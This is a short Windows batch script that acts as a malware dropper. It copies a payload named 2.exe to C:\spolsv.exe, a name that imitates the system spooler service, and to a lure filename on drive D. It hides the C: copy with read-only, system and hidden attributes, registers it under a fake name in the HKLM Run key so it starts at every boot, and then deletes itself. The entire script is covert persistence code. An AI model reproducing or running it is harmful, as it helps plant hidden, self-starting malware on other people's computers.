@ECHO off
color 0A
copy 2.exe C:\spolsv.exe >nul
copy 2.exe D:\×ÀÇò9.exe >nul
attrib +r +s +h C:\spolsv.exe >nul
@REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v nvscvs32s /t REG_SZ /d C:\spolsv.exe /f
del %0
